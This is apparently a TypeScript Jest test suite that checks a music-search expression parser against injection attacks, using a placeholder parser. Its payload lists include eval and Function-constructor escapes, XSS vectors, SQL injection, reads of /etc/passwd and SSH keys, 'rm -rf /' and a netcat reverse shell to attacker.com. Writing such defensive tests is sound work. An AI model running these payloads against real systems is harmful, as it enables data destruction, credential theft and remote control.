/**
 * Security tests for expression parser
 * Ensures no code injection, eval(), or new Function() usage
 * Validates safe handling of malicious input
 */

import { TrackWithMatching } from '../packages/music-search/src/types/TrackWithMatching';

// Mock expression parser (to be implemented)
type ExpressionParser = (expression: string) => (item: TrackWithMatching) => boolean;

const parseExpression: ExpressionParser = (expression: string) => {
    console.warn('Mock parseExpression called with:', expression);
    return () => false;
};

// Mock track for security testing
const createMockTrack = (): TrackWithMatching => ({
    id: 'security-test-track',
    title: 'Test Song',
    artist: 'Test Artist',
    album: 'Test Album',
    duration: 180,
    matching: {
        album: { match: true, contains: true, similarity: 0.8 },
        title: { match: true, contains: true, similarity: 0.9 },
        artist: { match: true, contains: true, similarity: 0.85 },
        artistInTitle: { match: false, contains: true, similarity: 0.7 },
        artistWithTitle: { match: false, contains: true, similarity: 0.75 }
    }
});

describe('Security Tests - Code Injection Prevention', () => {
    const mockTrack = createMockTrack();

    describe('JavaScript injection attempts', () => {
        const jsInjectionAttempts = [
            // Basic eval attempts
            'eval("console.log(\"hacked\")")',
            'eval("process.exit(1)")',
            'eval("require(\"fs\").unlinkSync(\"/etc/passwd\")")',
            
            // Function constructor attempts
            'new Function("return process.env")()',
            'Function("return global")()',
            'constructor.constructor("return process")()',
            '__proto__.constructor.constructor("return process")()',
            
            // Code execution via string interpolation
            '${eval("console.log(\"hacked\")")}',
            '`${process.exit(1)}`',
            '${require("child_process").exec("rm -rf /")}',
            
            // Attempts to break out of expression context
            'artist:match; eval("console.log(\"hacked\")")',
            'artist:match && eval("malicious code")',
            'artist:match || (function(){eval("hacked")})()',
            
            // Property access to dangerous globals
            'process.exit(1)',
            'global.process',
            'window.location',
            'document.cookie',
            'require("fs")',
            'import("fs")',
            
            // Prototype pollution attempts
            '__proto__.isAdmin = true',
            'constructor.prototype.hacked = true',
            'Object.prototype.toString = function(){return "hacked"}',
            
            // Complex nested attempts
            'artist:match && (()=>{eval("return process.env")})() && title:match',
            '(artist:match, eval("console.log(\\"hacked\\")"), title:match)',
            
            // Template literal injection
            '`artist:match ${eval("hacked")}`',
            'String.raw`artist:match ${process.exit(1)}`'
        ];

        jsInjectionAttempts.forEach((maliciousExpression, index) => {
            test(`should safely handle JS injection attempt ${index + 1}: ${maliciousExpression.substring(0, 50)}...`, () => {
                expect(() => {
                    const filter = parseExpression(maliciousExpression);
                    filter(mockTrack);
                }).not.toThrow();
                
                const filter = parseExpression(maliciousExpression);
                const result = filter(mockTrack);
                
                // Should return boolean (safe) result, not execute code
                expect(typeof result).toBe('boolean');
                expect(result).toBe(false); // Invalid expressions should return false
            });
        });
    });

    describe('HTML/XSS injection attempts', () => {
        const xssAttempts = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            'data:text/html,<script>alert(1)</script>',
            '<svg onload="alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            '"><script>alert("xss")</script>',
            '\'-alert(1)-\'',
            '<script>console.log("xss")</script>artist:match'
        ];

        xssAttempts.forEach((xssPayload, index) => {
            test(`should safely handle XSS attempt ${index + 1}: ${xssPayload.substring(0, 30)}...`, () => {
                const filter = parseExpression(xssPayload);
                const result = filter(mockTrack);
                
                expect(typeof result).toBe('boolean');
                expect(result).toBe(false);
            });
        });
    });

    describe('Path traversal and file system access attempts', () => {
        const pathTraversalAttempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '/etc/passwd',
            'C:\\Windows\\System32\\cmd.exe',
            'file:///etc/passwd',
            '\\\\network\\share\\file',
            '~/.ssh/id_rsa',
            '$HOME/.bashrc',
            '%USERPROFILE%\\Documents',
            'artist:match && require("fs").readFileSync("/etc/passwd")',
            'artist:match; fs.unlinkSync("important.txt")'
        ];

        pathTraversalAttempts.forEach((pathAttempt, index) => {
            test(`should safely handle path traversal attempt ${index + 1}: ${pathAttempt}`, () => {
                const filter = parseExpression(pathAttempt);
                const result = filter(mockTrack);
                
                expect(typeof result).toBe('boolean');
                expect(result).toBe(false);
            });
        });
    });

    describe('SQL injection style attempts', () => {
        const sqlInjectionAttempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM tracks WHERE 1=1",
            "artist:match'; TRUNCATE TABLE important_data; --",
            "UNION SELECT * FROM sensitive_table",
            "1' UNION SELECT password FROM users--",
            "; EXEC xp_cmdshell('format c:') --"
        ];

        sqlInjectionAttempts.forEach((sqlAttempt, index) => {
            test(`should safely handle SQL-style injection attempt ${index + 1}`, () => {
                const filter = parseExpression(sqlAttempt);
                const result = filter(mockTrack);
                
                expect(typeof result).toBe('boolean');
                expect(result).toBe(false);
            });
        });
    });

    describe('Command injection attempts', () => {
        const commandInjectionAttempts = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '&& format c:',
            '`rm -rf /`',
            '$(whoami)',
            '${rm -rf /}',
            'artist:match; system("rm important.txt")',
            'artist:match && exec("malicious command")',
            '| nc attacker.com 4444 -e /bin/sh'
        ];

        commandInjectionAttempts.forEach((cmdAttempt, index) => {
            test(`should safely handle command injection attempt ${index + 1}`, () => {
                const filter = parseExpression(cmdAttempt);
                const result = filter(mockTrack);
                
                expect(typeof result).toBe('boolean');
                expect(result).toBe(false);
            });
        });
    });

    describe('Memory and DoS attack attempts', () => {
        test('should handle extremely long input safely', () => {
            const longExpression = 'a'.repeat(1000000); // 1MB of 'a' characters
            
            expect(() => {
                const filter = parseExpression(longExpression);
                filter(mockTrack);
            }).not.toThrow();
            
            const filter = parseExpression(longExpression);
            const result = filter(mockTrack);
            expect(typeof result).toBe('boolean');
        });

        test('should handle deeply nested expressions safely', () => {
            let deepExpression = 'artist:match';
            for (let i = 0; i < 1000; i++) {
                deepExpression = `(${deepExpression})`;
            }
            
            expect(() => {
                const filter = parseExpression(deepExpression);
                filter(mockTrack);
            }).not.toThrow();
        });

        test('should handle complex regex DoS attempts', () => {
            const regexDoSAttempts = [
                'a'.repeat(10000) + 'artist:match',
                '((((((((((a))))))))))',
                'a*a*a*a*a*a*a*a*a*a*a*a*',
                '(a+)+$'
            ];

            regexDoSAttempts.forEach(attempt => {
                const start = performance.now();
                const filter = parseExpression(attempt);
                filter(mockTrack);
                const duration = performance.now() - start;
                
                // Should not take more than 1 second to parse/execute
                expect(duration).toBeLessThan(1000);
            });
        });

        test('should handle many repeated operations safely', () => {
            const repeatedExpression = Array(10000).fill('artist:match').join(' OR ');
            
            expect(() => {
                const filter = parseExpression(repeatedExpression);
                filter(mockTrack);
            }).not.toThrow();
        });
    });

    describe('Unicode and encoding attack attempts', () => {
        const unicodeAttacks = [
            // Unicode normalization attacks
            '\\u0061\\u0072\\u0074\\u0069\\u0073\\u0074\\u003a\\u006d\\u0061\\u0074\\u0063\\u0068', // artist:match in unicode
            '\\x61\\x72\\x74\\x69\\x73\\x74\\x3a\\x6d\\x61\\x74\\x63\\x68', // artist:match in hex
            '%61%72%74%69%73%74%3a%6d%61%74%63%68', // artist:match URL encoded
            
            // Homoglyph attacks
            'аrtist:match', // Cyrillic 'а' instead of Latin 'a'
            'artist:mаtch', // Cyrillic 'а' in match
            
            // Zero-width characters
            'artist\u200B:match', // Zero-width space
            'artist\uFEFF:match', // Zero-width no-break space
            
            // Control characters
            'artist\x00:match', // Null character
            'artist\r\n:match', // CRLF injection
            'artist\x1b[31m:match', // ANSI escape sequence
            
            // Overlong UTF-8 encodings
            '\xC0\x80', // Overlong encoding of null
            '\xE0\x80\x80' // Another overlong sequence
        ];

        unicodeAttacks.forEach((unicodeAttack, index) => {
            test(`should safely handle Unicode attack ${index + 1}`, () => {
                const filter = parseExpression(unicodeAttack);
                const result = filter(mockTrack);
                
                expect(typeof result).toBe('boolean');
                // Most should be invalid and return false
            });
        });
    });
});

describe('Security Tests - Parser Implementation Validation', () => {
    describe('No eval() usage verification', () => {
        test('parseExpression should not use eval() internally', () => {
            // This test would inspect the actual implementation
            // For now, we test that dangerous expressions don't execute
            const track = createMockTrack();
            
            // These should not execute as JavaScript
            const dangerousExpressions = [
                'console.log("this should not execute")',
                'alert("hacked")',
                'document.write("xss")'
            ];
            
            dangerousExpressions.forEach(expr => {
                const filter = parseExpression(expr);
                expect(filter(track)).toBe(false);
            });
        });

        test('should not allow dynamic function creation', () => {
            const track = createMockTrack();
            
            const functionCreationAttempts = [
                'new Function("return true")',
                'Function("return false")',
                'eval("function(){return true}")',
                '(function(){return true})()'
            ];
            
            functionCreationAttempts.forEach(attempt => {
                const filter = parseExpression(attempt);
                expect(filter(track)).toBe(false);
            });
        });
    });

    describe('Input sanitization validation', () => {
        test('should only accept whitelisted field names', () => {
            const track = createMockTrack();
            
            const validFields = ['artist', 'title', 'album', 'artistInTitle', 'artistWithTitle'];
            const invalidFields = ['__proto__', 'constructor', 'process', 'global', 'window', 'document', 'eval'];
            
            validFields.forEach(field => {
                const filter = parseExpression(`${field}:match`);
                // Valid fields should parse (might return true or false depending on track)
                expect(() => filter(track)).not.toThrow();
            });
            
            invalidFields.forEach(field => {
                const filter = parseExpression(`${field}:match`);
                expect(filter(track)).toBe(false); // Invalid fields should always return false
            });
        });

        test('should only accept whitelisted operations', () => {
            const track = createMockTrack();
            
            const validOperations = ['match', 'contains', 'similarity>=0.8'];
            const invalidOperations = ['eval', 'exec', 'system', 'require', 'import'];
            
            validOperations.forEach(op => {
                const filter = parseExpression(`artist:${op}`);
                expect(() => filter(track)).not.toThrow();
            });
            
            invalidOperations.forEach(op => {
                const filter = parseExpression(`artist:${op}`);
                expect(filter(track)).toBe(false);
            });
        });

        test('should validate similarity threshold values', () => {
            const track = createMockTrack();
            
            const validThresholds = ['0', '0.5', '0.8', '1.0', '1'];
            const invalidThresholds = ['eval("hacked")', 'process.exit(1)', '${malicious}', 'NaN', 'Infinity'];
            
            validThresholds.forEach(threshold => {
                const filter = parseExpression(`artist:similarity>=${threshold}`);
                expect(() => filter(track)).not.toThrow();
            });
            
            invalidThresholds.forEach(threshold => {
                const filter = parseExpression(`artist:similarity>=${threshold}`);
                expect(filter(track)).toBe(false);
            });
        });
    });

    describe('Error handling security', () => {
        test('should not expose internal errors that could reveal system info', () => {
            const maliciousExpressions = [
                'artist:match.toString.constructor("return process")()',
                '__dirname',
                '__filename',
                'module.exports',
                'require.resolve'
            ];
            
            maliciousExpressions.forEach(expr => {
                expect(() => {
                    const filter = parseExpression(expr);
                    filter(createMockTrack());
                }).not.toThrow();
            });
        });

        test('should handle syntax errors safely', () => {
            const syntaxErrors = [
                '(((',
                ')))',
                'artist:match AND AND title:match',
                'OR OR OR',
                'artist:match >=< title:match'
            ];
            
            syntaxErrors.forEach(expr => {
                expect(() => {
                    const filter = parseExpression(expr);
                    filter(createMockTrack());
                }).not.toThrow();
                
                const filter = parseExpression(expr);
                expect(filter(createMockTrack())).toBe(false);
            });
        });
    });
});

describe('Security Tests - Runtime Safety', () => {
    describe('Execution context isolation', () => {
        test('expressions should not access global scope', () => {
            const track = createMockTrack();
            
            // Try to access various global objects
            const globalAccessAttempts = [
                'global',
                'window', 
                'document',
                'process',
                'Buffer',
                'require',
                'module',
                '__dirname',
                '__filename',
                'exports'
            ];
            
            globalAccessAttempts.forEach(globalObj => {
                const filter = parseExpression(globalObj);
                expect(filter(track)).toBe(false);
            });
        });

        test('expressions should not modify external state', () => {
            let externalState = { modified: false };
            const track = createMockTrack();
            
            const stateModificationAttempts = [
                'externalState.modified = true',
                'this.hacked = true',
                'arguments[0].hacked = true'
            ];
            
            stateModificationAttempts.forEach(attempt => {
                const filter = parseExpression(attempt);
                filter(track);
                
                expect(externalState.modified).toBe(false);
                expect((track as any).hacked).toBeUndefined();
            });
        });

        test('expressions should not access track properties beyond matching', () => {
            const track = createMockTrack();
            
            const propertyAccessAttempts = [
                'item.id',
                'item.title', 
                'item.artist',
                'item.album',
                'item.__proto__',
                'item.constructor'
            ];
            
            propertyAccessAttempts.forEach(attempt => {
                const filter = parseExpression(attempt);
                expect(filter(track)).toBe(false);
            });
        });
    });

    describe('Memory safety', () => {
        test('should not create memory leaks with complex expressions', () => {
            const initialMemory = process.memoryUsage().heapUsed;
            
            for (let i = 0; i < 1000; i++) {
                const complexExpression = `(artist:match OR title:contains) AND (album:similarity>=0.${i % 10}) OR artistWithTitle:similarity>=0.9`;
                const filter = parseExpression(complexExpression);
                filter(createMockTrack());
            }
            
            // Force garbage collection if available
            if (global.gc) {
                global.gc();
            }
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = finalMemory - initialMemory;
            
            // Should not increase memory significantly (allow 10MB tolerance)
            expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
        });

        test('should handle circular references safely', () => {
            const track = createMockTrack();
            
            // Create potential circular reference in track
            (track as any).circular = track;
            
            const filter = parseExpression('artist:match AND title:contains');
            expect(() => filter(track)).not.toThrow();
            
            const result = filter(track);
            expect(typeof result).toBe('boolean');
        });
    });
});